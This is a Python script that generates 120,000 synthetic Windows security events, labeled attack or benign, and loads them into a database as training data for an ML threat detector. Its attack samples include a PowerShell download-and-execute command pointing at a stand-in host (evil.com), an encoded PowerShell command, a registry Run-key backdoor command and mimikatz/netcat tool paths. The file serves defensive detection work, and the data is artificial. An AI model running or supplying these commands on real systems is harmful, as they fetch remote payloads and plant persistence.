"""Generate 100K+ synthetic events with proper feature vectors for ML training."""
import random
import sys
import time
import uuid
from datetime import UTC, datetime, timedelta
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from backend.ml.synthetic import generate_synthetic_dataset
from backend.database.connection import SessionLocal
from backend.database.models import NormalizedEvent, Verdict

HOSTS = [
    "HR-WIN10-01", "HR-WIN10-02", "FIN-WIN10-01", "FIN-WIN10-02",
    "IT-WIN11-01", "IT-WIN11-02", "IT-SRV-DC01", "IT-SRV-DC02",
    "ENG-WIN10-01", "ENG-WIN10-02", "ENG-UBUNTU-01", "MKT-WIN10-01",
    "MKT-WIN10-02", "OPS-WIN10-01", "OPS-WIN10-02", "DEV-WIN11-01",
    "DEV-WSL-01", "SEC-WIN10-01", "SEC-SRV-01", "EXEC-WIN10-01",
]
USERS = ["admin", "jsmith", "mjones", "svc_backup", "svc_sql", "john.doe", "jane.smith", "bob.wilson", "alice.brown", "SYSTEM"]
SOURCE_IPS = ["10.0.0.1", "10.0.0.2", "10.0.0.10", "10.0.0.20", "192.168.1.100", "192.168.1.101", "172.16.0.10", "203.0.113.50"]
MALICIOUS_IPS = ["203.0.113.66", "203.0.113.77", "198.51.100.66", "198.51.100.77"]

def make_login_facts(is_attack, rng):
    logon_type = rng.choice([2, 3, 7, 10, 11] if not is_attack else [3, 10, 11])
    source_ip = rng.choice(MALICIOUS_IPS if is_attack else SOURCE_IPS)
    target_user = rng.choice(USERS)
    sub_status = rng.choice([0, 0xC000006A, 0xC0000064] if is_attack else [0])
    return {
        "logon_type": logon_type,
        "source_ip": source_ip,
        "target_user": target_user,
        "sub_status": sub_status,
        "is_locked": 1 if is_attack and rng.random() < 0.3 else 0,
        "process_name": "svchost.exe" if not is_attack else rng.choice(["mimikatz.exe", "procdump.exe", "cmd.exe"]),
    }

def make_process_facts(is_attack, rng):
    image_path = rng.choice([
        r"C:\Windows\System32\cmd.exe",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r"C:\Windows\System32\svchost.exe",
    ] if not is_attack else [
        r"C:\Windows\Temp\mimikatz.exe",
        r"C:\Users\Public\nc.exe",
        r"C:\Windows\System32\cmd.exe",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    ])
    command_line = ""
    parent_process = "explorer.exe"
    has_encoded = 0
    has_download = 0
    has_hidden = 0
    if is_attack:
        cmd = rng.choice([
            "powershell -enc SQBmACgAJABjAG0AZAA=",
            "cmd.exe /c whoami /all",
            "powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
            "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /d C:\\temp\\evil.exe",
        ])
        command_line = cmd
        has_encoded = 1 if "enc" in cmd else 0
        has_download = 1 if "DownloadString" in cmd or "DownloadFile" in cmd else 0
        has_hidden = 1 if rng.random() < 0.4 else 0
        parent_process = rng.choice(["winword.exe", "outlook.exe", "explorer.exe", "services.exe"])
    return {
        "image_path": image_path,
        "command_line": command_line,
        "parent_process": parent_process,
        "has_encoded": has_encoded,
        "has_download": has_download,
        "has_hidden": has_hidden,
        "cmdline_len": len(command_line),
        "target_user": rng.choice(USERS),
    }

def make_network_facts(is_attack, rng):
    remote_ip = rng.choice(MALICIOUS_IPS if is_attack else SOURCE_IPS)
    remote_port = rng.choice([443, 80, 22, 53] if not is_attack else [4444, 5555, 8080, 1337, 443])
    return {
        "remote_ip": remote_ip,
        "remote_port": remote_port,
        "protocol": rng.choice(["TCP", "UDP"]),
        "bytes_sent": rng.randint(100, 10000) if not is_attack else rng.randint(10000, 1000000),
        "bytes_recv": rng.randint(100, 10000) if not is_attack else rng.randint(1000, 50000),
    }

def generate_events(count, seed=42):
    rng = random.Random(seed)
    events = []
    base_time = datetime(2024, 1, 1, tzinfo=UTC)
    
    # 60% attack, 40% benign
    n_attack = int(count * 0.6)
    n_benign = count - n_attack
    
    # Event ID distribution for attacks
    attack_event_dist = {
        4624: 0.25, 4625: 0.15, 4688: 0.20, 4103: 0.10,
        4104: 0.10, 4720: 0.05, 4726: 0.03, 4732: 0.03,
        7045: 0.04, 4698: 0.05,
    }
    benign_event_dist = {
        4624: 0.40, 4625: 0.05, 4688: 0.30, 4103: 0.08,
        4104: 0.07, 4634: 0.05, 4647: 0.03, 4771: 0.02,
    }
    
    def pick_event_id(dist, rng):
        r = rng.random()
        cumulative = 0
        for eid, prob in dist.items():
            cumulative += prob
            if r <= cumulative:
                return eid
        return list(dist.keys())[-1]
    
    for i in range(n_attack):
        eid = pick_event_id(attack_event_dist, rng)
        if eid in (4624, 4625, 4634, 4647, 4648, 4740, 4771):
            facts = make_login_facts(True, rng)
            message = f"Logon Type: {facts['logon_type']} Source: {facts['source_ip']} User: {facts['target_user']}"
        elif eid in (4688, 4720, 4726, 4732, 7045, 4698, 4104, 4103):
            facts = make_process_facts(True, rng)
            message = f"Process: {facts['image_path']} Cmd: {facts['command_line'][:100]}"
        else:
            facts = make_network_facts(True, rng)
            message = f"Network: {facts['remote_ip']}:{facts['remote_port']}"
        
        ts = base_time + timedelta(seconds=rng.randint(0, 365*24*3600))
        host = rng.choice(HOSTS)
        user = rng.choice(USERS)
        
        events.append({
            "event_id": eid,
            "host": host,
            "user": user,
            "timestamp": ts.isoformat(),
            "message": message,
            "raw_json": {"facts": facts, "event_id": eid, "host": host, "user": user},
            "is_attack": True,
        })
    
    for i in range(n_benign):
        eid = pick_event_id(benign_event_dist, rng)
        if eid in (4624, 4625, 4634, 4647, 4648, 4740, 4771):
            facts = make_login_facts(False, rng)
            message = f"Logon Type: {facts['logon_type']} Source: {facts['source_ip']} User: {facts['target_user']}"
        elif eid in (4688, 4720, 4726, 4732, 7045, 4698, 4104, 4103):
            facts = make_process_facts(False, rng)
            message = f"Process: {facts['image_path']} Cmd: {facts['command_line'][:100]}"
        else:
            facts = make_network_facts(False, rng)
            message = f"Network: {facts['remote_ip']}:{facts['remote_port']}"
        
        ts = base_time + timedelta(seconds=rng.randint(0, 365*24*3600))
        host = rng.choice(HOSTS)
        user = rng.choice(USERS)
        
        events.append({
            "event_id": eid,
            "host": host,
            "user": user,
            "timestamp": ts.isoformat(),
            "message": message,
            "raw_json": {"facts": facts, "event_id": eid, "host": host, "user": user},
            "is_attack": False,
        })
    
    events.sort(key=lambda e: e["timestamp"])
    return events

def insert_events(events):
    session = SessionLocal()
    try:
        count = 0
        batch_size = 500
        for i in range(0, len(events), batch_size):
            batch = events[i:i+batch_size]
            for ev in batch:
                ne = NormalizedEvent(
                    event_id=ev["event_id"],
                    category="Synthetic",
                    source="baraq-synthetic-100k",
                    user=ev["user"],
                    host=ev["host"],
                    org="BARAQ",
                    demo=False,
                    risk=85 if ev["is_attack"] else 10,
                    severity="high" if ev["is_attack"] else "info",
                    message=ev["message"],
                    timestamp=datetime.fromisoformat(ev["timestamp"]),
                    data_integrity="synthetic",
                    raw_json=ev["raw_json"],
                    is_anomaly=ev["is_attack"],
                    ml_score=0.0,
                    risk_score=85 if ev["is_attack"] else 10,
                )
                session.add(ne)
                count += 1
            
            session.commit()
            print(f"  Inserted {count}/{len(events)} events", flush=True)
        
        return count
    except Exception as e:
        session.rollback()
        print(f"ERROR: {e}", flush=True)
        raise
    finally:
        session.close()

if __name__ == "__main__":
    print("=== Generating 100K+ synthetic events ===", flush=True)
    t0 = time.time()
    
    events = generate_events(120000, seed=42)
    print(f"Generated {len(events)} events in {time.time()-t0:.1f}s", flush=True)
    
    attacks = sum(1 for e in events if e["is_attack"])
    benign = len(events) - attacks
    print(f"Attack: {attacks} ({attacks*100//len(events)}%), Benign: {benign} ({benign*100//len(events)}%)", flush=True)
    
    # Count by event ID
    from collections import Counter
    eid_counts = Counter(e["event_id"] for e in events)
    print(f"Event IDs: {dict(eid_counts)}", flush=True)
    
    print(f"\nInserting into DB...", flush=True)
    count = insert_events(events)
    print(f"\nDone! {count} events inserted in {time.time()-t0:.1f}s", flush=True)
